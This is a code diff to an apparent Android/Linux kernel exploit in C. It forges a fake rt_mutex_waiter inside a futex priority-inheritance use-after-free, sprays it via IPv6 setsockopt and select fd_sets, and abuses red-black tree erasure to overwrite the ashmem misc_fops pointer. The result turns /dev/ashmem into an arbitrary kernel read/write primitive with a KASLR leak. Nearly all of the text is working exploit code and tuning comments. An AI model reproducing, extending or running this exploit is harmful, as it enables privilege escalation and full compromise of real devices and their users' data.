@@ -156,9 +156,14 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, 0, "pi_left"},
     {FAKE_WAITER_PI_TREE_PRIO_OFF, 1, "pi_prio"},
     {FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0, "pi_deadline"},
-    {FAKE_WAITER_TASK_OFF,
-     pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
-     "task"},
+    /* Use the real init_task, never fake_task: after the punch, the route
+     * teardown runs FUTEX_UNLOCK_PI(f_pi_target), whose
+     * mark_wakeup_next_waiter() calls wake_q_add(waiter->task). Waking
+     * fake_task dereferences a sprayed page (state bytes 0x41) and can hang
+     * or crash; init_task is TASK_RUNNING so try_to_wake_up() returns
+     * immediately without touching the task. The write primitive only uses
+     * the tree fields, not waiter->task. */
+    {FAKE_WAITER_TASK_OFF, text_addr(INIT_TASK), "task"},
     {FAKE_WAITER_LOCK_OFF, fake_lock, "lock"},
     {FAKE_WAITER_WAKE_STATE_OFF, 3, "wake_state"},
   };
@@ -347,7 +352,7 @@ static int mcast_payload_off(void) {
  * protocol combinations. Walk a flavor list, keep the first IPv6 socket that
  * opens, and log every miss so a blanket socket() ban is easy to tell apart
  * from a family-specific one. */
-static int mcast_open_socket(void) {
+int mcast_open_socket(void) {
   struct mcast_sock_flavor {
     int family;
     int type;
@@ -384,17 +389,25 @@ void prepare_mcast_payload(unsigned char *payload, size_t len) {
                base, len);
     return;
   }
-  /* Same fake rt_mutex_waiter words as the pselect fd_set route; the mcast
-   * route places them inside the 264-byte setsockopt(IPPROTO_IPV6, 46) copy
-   * at the derived mcast_payload_off instead of the select fd_set. */
+  /* Fake rt_mutex_waiter placed inside the 264-byte
+   * setsockopt(IPPROTO_IPV6, 46) copy at mcast_payload_off. tree_entry
+   * carries the write primitive (tree_left != 0, tree_right == 0),
+   * pi_tree_entry stays empty and the punch chain terminates at
+   * owner == NULL. With those two
+   * conditions __rb_erase_augmented() takes the "else if (!child)" branch
+   * and performs:
+   *   write 1: *(tree_left) = tree_pc   (ASHMEM_MISC_FOPS slot <- fake_fops)
+   *   write 2: *(tree_pc & ~3 [+8]) = tree_left (parent must stay readable)
+   * so tree_pc uses fake_fops (owned spray page) and tree_left targets the
+   * ashmem fops slot, same landing as the pselect route. */
   struct mcast_waiter_word {
     size_t off;
     uint64_t value;
     const char *name;
   } words[] = {
-    {0x00, 0, "tree_pc"},
+    {0x00, fake_fops, "tree_pc"},
     {0x08, 0, "tree_right"},
-    {0x10, 0, "tree_left"},
+    {0x10, (uint64_t)data_addr(ASHMEM_MISC_FOPS), "tree_left"},
     {FAKE_WAITER_TREE_PRIO_OFF, 1, "tree_prio"},
     {FAKE_WAITER_TREE_DEADLINE_OFF, 0, "tree_deadline"},
     {FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, 0, "pi_parent"},
@@ -435,137 +448,121 @@ void do_mcast_fake_lock_route(void) {
              "fops=%016zx\n", page_base, fake_lock, fake_fops);
     return;
   }
-  int sock = mcast_open_socket();
+  int sock = mcast_sock;
   if (sock < 0) {
     cfi_last_step = 41;
     cfi_last_errno = errno;
-    pr_error("mcast route: no IPv6 socket available (last errno=%d %s)\n",
+    pr_error("mcast route: no IPv6 socket (pre-UAF open failed, errno=%d %s)\n",
              errno, strerror(errno));
     return;
   }
 
   struct timespec route_t0;
   clock_gettime(CLOCK_MONOTONIC, &route_t0);
-  int calls = 0;
-  int success = 0;
-  int route_verified = 0;
-  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
-       route_attempt++) {
-    if (route_attempt != 1) {
-      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-      if (!page_base || !fake_lock || !fake_fops) {
-        cfi_last_step = 42;
-        cfi_last_errno = errno;
-        pr_error("mcast retry page prepare failed attempt=%d base=%016zx "
-                 "lock=%016zx fops=%016zx\n",
-                 route_attempt, page_base, fake_lock, fake_fops);
-        break;
-      }
-    }
+  /* mcast full chain: one route only lands the write primitive
+   * (misc_fops <- fake_fops). The waiter's WAIT_REQUEUE_PI times out and
+   * leaves the real pi_state tree healthy; the setsockopt copy overwrites
+   * the stack waiter and the punch erases it against the fake_lock tree.
+   * After landing, waiter/owner/consumer block forever (stack held, lock
+   * held, no more punches) and the main thread does all W1/W2/W3 writes
+   * via configfs, never touching the futex tree again. */
+  unsigned char payload[MCAST_ROUTE_COPY_LEN];
+  prepare_mcast_payload(payload, sizeof(payload));
+  pr_info("mcast route setup payload_off=0x%x page=%016zx fake_lock=%016zx "
+          "fake_w0=%016zx fake_task=%016zx\n",
+          mcast_payload_off(), page_base, fake_lock, fake_w0, fake_task);
 
-    unsigned char payload[MCAST_ROUTE_COPY_LEN];
-    prepare_mcast_payload(payload, sizeof(payload));
-    pr_info("mcast route setup attempt=%d payload_off=0x%x page=%016zx "
-            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx\n",
-            route_attempt, mcast_payload_off(),
-            page_base, fake_lock, fake_w0, fake_task);
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&consumer_futex_locked, 0);
+  atomic_store(&consumer_futex_entered, 0);
+  atomic_store(&punch_consume_stop, 0);
+  int delay_usec = route_delay_usec(1);
+  atomic_store(&main_route_delay_usec, delay_usec);
 
-    atomic_store(&consumer_calls, 0);
-    atomic_store(&consumer_success, 0);
-    atomic_store(&punch_consume_stop, 0);
-    int delay_usec = route_delay_usec(route_attempt);
-    atomic_store(&main_route_delay_usec, delay_usec);
+  pr_info("mcast pre-setsockopt +%.0fms\n", fops_elapsed_ms(&route_t0));
+  errno = 0;
+  int ret = setsockopt(sock, IPPROTO_IPV6, MCAST_ROUTE_OPTNAME,
+                       payload, sizeof(payload));
+  int saved_errno = errno;
+  /* Arm the punch consumer only after the copy lands, and keep logging
+   * until after the window: a write() syscall overwrites the stack copy. */
+  atomic_store(&punch_consume_go, 1);
 
-    pr_info("mcast pre-setsockopt +%.0fms\n", fops_elapsed_ms(&route_t0));
-    errno = 0;
-    int ret = setsockopt(sock, IPPROTO_IPV6, MCAST_ROUTE_OPTNAME,
-                         payload, sizeof(payload));
-    int saved_errno = errno;
-    /* Arm the punch consumer only after the copy lands, and keep logging
-     * until after the window: a write() syscall overwrites the stack copy. */
-    atomic_store(&punch_consume_go, route_attempt);
-
-    /* The 264-byte copy persists on this thread's kernel stack until the
-     * next deep syscall, so hold the punch window in userspace (the mirror
-     * of select() blocking in the pselect route). clock_gettime is served
-     * by the vDSO, so no syscall touches the stack region here. */
-    struct timespec window = {
-      .tv_sec = PSELECT_TIMEOUT_SEC,
-#ifdef PSELECT_TIMEOUT_USEC
-      .tv_nsec = PSELECT_TIMEOUT_USEC * 1000L,
-#else
-      .tv_nsec = 0,
-#endif
-    };
-    struct timespec until;
-    clock_gettime(CLOCK_MONOTONIC, &until);
-    until.tv_sec += window.tv_sec;
-    until.tv_nsec += window.tv_nsec;
-    if (until.tv_nsec >= 1000000000L) {
-      until.tv_sec++;
-      until.tv_nsec -= 1000000000L;
-    }
-    for (;;) {
-      struct timespec now;
-      clock_gettime(CLOCK_MONOTONIC, &now);
-      if (now.tv_sec > until.tv_sec ||
-          (now.tv_sec == until.tv_sec && now.tv_nsec >= until.tv_nsec)) {
-        break;
-      }
-      __asm__ volatile("yield" ::: "memory");
-    }
-    atomic_store(&punch_consume_go, 0);
-
-    calls = atomic_load(&consumer_calls);
-    success = atomic_load(&consumer_success);
-    pr_info("mcast post-setsockopt +%.0fms ret=%d errno=%d\n",
-            fops_elapsed_ms(&route_t0), ret, saved_errno);
-    pr_info("mcast window done attempt=%d ret=%d errno=%d calls=%d "
-            "success=%d delay=%d sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
-            route_attempt, ret, saved_errno, calls, success, delay_usec,
-            atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
-            atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
-            atomic_load(&consumer_futex_locked),
-            atomic_load(&consumer_futex_entered));
-
-    int route_quality_miss = 0;
-    int route_signal = calls > 0 && success > 0;
-    if (route_signal) {
-      if (pselect_custom_write_enabled()) {
-        cfi_last_step = 0;
-        cfi_last_errno = 0;
-        route_verified = 1;
-      } else if (try_cfi_stage()) {
-        cfi_last_step = 0;
-        route_verified = 1;
-      } else if (!cfi_last_step) {
-        cfi_last_step = 43;
-      }
-    }
-    if (!route_verified && route_signal) {
-      route_quality_miss = 1;
-      if (cfi_last_step == 43) {
-        cfi_last_step = 35;
-      }
-      pr_info("mcast route quality miss attempt=%d/%d delay=%d; "
-              "refreshing FOPS page\n",
-              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, delay_usec);
-    } else if (!route_verified) {
-      cfi_last_step = 44;
-      cfi_last_errno = saved_errno;
-    }
-
-    if (route_quality_miss) {
-      continue;
-    }
-    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
+#if MCAST_REFRESH_WINDOW
+  /* Keep refreshing the 264B stack copy while the punch chain walks it.
+   * The consumer clears punch_consume_go when done; a timeout caps the
+   * refresh in case the consumer never fires. */
+  struct timespec until;
+  clock_gettime(CLOCK_MONOTONIC, &until);
+  until.tv_sec += MCAST_WINDOW_TIMEOUT_MSEC / 1000;
+  until.tv_nsec += (MCAST_WINDOW_TIMEOUT_MSEC % 1000) * 1000000L;
+  if (until.tv_nsec >= 1000000000L) {
+    until.tv_sec++;
+    until.tv_nsec -= 1000000000L;
+  }
+  for (;;) {
+    if (atomic_load(&punch_consume_go) != 1) {
       break;
     }
-    pr_info("mcast cfi write miss attempt=%d/%d errno=%d; "
-            "refreshing FOPS page\n",
-            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    if (now.tv_sec > until.tv_sec ||
+        (now.tv_sec == until.tv_sec && now.tv_nsec >= until.tv_nsec)) {
+      break;
+    }
+    setsockopt(sock, IPPROTO_IPV6, MCAST_ROUTE_OPTNAME,
+               payload, sizeof(payload));
   }
-  close(sock);
+#else
+  /* Old model: single copy followed by a userspace busy-wait
+   * (vDSO clock_gettime + yield, no kernel entry). */
+  struct timespec window = {
+    .tv_sec = PSELECT_TIMEOUT_SEC,
+#ifdef PSELECT_TIMEOUT_USEC
+    .tv_nsec = PSELECT_TIMEOUT_USEC * 1000L,
+#else
+    .tv_nsec = 0,
+#endif
+  };
+  struct timespec until;
+  clock_gettime(CLOCK_MONOTONIC, &until);
+  until.tv_sec += window.tv_sec;
+  until.tv_nsec += window.tv_nsec;
+  if (until.tv_nsec >= 1000000000L) {
+    until.tv_sec++;
+    until.tv_nsec -= 1000000000L;
+  }
+  for (;;) {
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    if (now.tv_sec > until.tv_sec ||
+        (now.tv_sec == until.tv_sec && now.tv_nsec >= until.tv_nsec)) {
+      break;
+    }
+    __asm__ volatile("yield" ::: "memory");
+  }
+#endif
+  atomic_store(&punch_consume_go, 0);
+
+  int calls = atomic_load(&consumer_calls);
+  int success = atomic_load(&consumer_success);
+  pr_info("mcast post-setsockopt +%.0fms ret=%d errno=%d\n",
+          fops_elapsed_ms(&route_t0), ret, saved_errno);
+  pr_info("mcast window done ret=%d errno=%d calls=%d "
+          "success=%d delay=%d sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
+          ret, saved_errno, calls, success, delay_usec,
+          atomic_load(&consumer_sched_ret), atomic_load(&consumer_sched_errno),
+          atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
+          atomic_load(&consumer_futex_locked),
+          atomic_load(&consumer_futex_entered));
+
+  /* Landed if the consumer punched and sched_setattr succeeded. The write
+   * primitive only installs misc_fops <- fake_fops; W1/W2/W3 run on the
+   * main thread via configfs. */
+  int landed = calls > 0 && success > 0;
+  cfi_last_step = landed ? 0 : 44;
+  cfi_last_errno = landed ? 0 : saved_errno;
   pr_info("mcast route done calls=%d success=%d step=%d errno=%d "
           "sched=%d/%d futex=%d/%d locked=%d entered=%d\n",
           calls, success, cfi_last_step, cfi_last_errno,
@@ -573,6 +570,85 @@ void do_mcast_fake_lock_route(void) {
           atomic_load(&consumer_futex_ret), atomic_load(&consumer_futex_errno),
           atomic_load(&consumer_futex_locked),
           atomic_load(&consumer_futex_entered));
+}
+
+/* Step 2 (main thread, route landed, route threads blocked): install the
+ * configfs primitive. With misc_fops replaced, opening /dev/ashmem binds
+ * fd->f_op to fake_fops; after a write verify, fops-slot repair and a
+ * misc_fops read-back, the fd is an arbitrary 8-byte read/write primitive.
+ * Returns the fd, or -1 on failure. */
+int mcast_install_fake_fops(void) {
+  int fd = open_ashmem_device();
+  if (fd < 0) {
+    cfi_last_step = 50;
+    cfi_last_errno = errno;
+    pr_error("mcast configfs open failed path=%s errno=%d\n",
+             ashmem_path, errno);
+    return -1;
+  }
+
+  char payload[] = "MCAST_CFG_BIN_WRITE_OK";
+  ssize_t n = configfs_write_once(fd, binwrite_target, payload,
+                                  sizeof(payload));
+  pr_info("mcast configfs write ret=%zd errno=%d\n", n, errno);
+  if (n != (ssize_t)sizeof(payload)) {
+    cfi_last_step = 51;
+    cfi_last_errno = errno;
+    pr_error("mcast configfs write verify failed\n");
+    close(fd);
+    return -1;
+  }
+
+  if (!repair_fake_fops_llseek(fd)) {
+    cfi_last_step = 52;
+    cfi_last_errno = errno;
+    pr_error("mcast repair fake fops llseek failed\n");
+    close(fd);
+    return -1;
+  }
+
+  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uint64_t v = 0;
+  ssize_t rb = configfs_read_once(fd, misc_fops, &v, sizeof(v));
+  if (rb != (ssize_t)sizeof(v) || v != fake_fops) {
+    cfi_last_step = 53;
+    cfi_last_errno = errno;
+    pr_error("mcast misc_fops verify ret=%zd value=%016llx want=%016zx\n",
+             rb, (unsigned long long)v, fake_fops);
+    close(fd);
+    return -1;
+  }
+  pr_info("mcast misc_fops verified=%016llx\n", (unsigned long long)v);
+
+  /* Resolve KASLR from the real ashmem fops table (same verify as the
+   * pselect route); fall back to the image base on failure. */
+  if (!leak_kernel_base(fd)) {
+    pr_warning("mcast kaslr leak failed step=%d; falling back to image base\n",
+               kaslr_step);
+    kaslr_base = KIMAGE_TEXT_BASE;
+    kaslr_slide = 0;
+    kaslr_done = 1;
+  }
+  cfi_last_step = 0;
+  cfi_last_errno = 0;
+  return fd;
+}
+
+/* Restore misc_fops to the real ashmem fops table; new ashmem opens then
+ * bypass fake_fops. The already-open fd keeps its binding, so configfs
+ * writes remain usable. */
+int mcast_restore_misc_fops(int fd) {
+  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uint64_t original = canon_addr(ASHMEM_FOPS);
+  ssize_t wr = configfs_write_once(fd, misc_fops, &original,
+                                   sizeof(original));
+  uint64_t after = 0;
+  ssize_t rd = configfs_read_once(fd, misc_fops, &after, sizeof(after));
+  cfi_restore_ret = wr;
+  pr_info("mcast restore misc_fops ret=%zd after=%016llx want=%016llx\n",
+          wr, (unsigned long long)after, (unsigned long long)original);
+  return wr == (ssize_t)sizeof(original) &&
+         rd == (ssize_t)sizeof(after) && after == original;
 }
 
 int repair_fake_fops_llseek(int fd) {
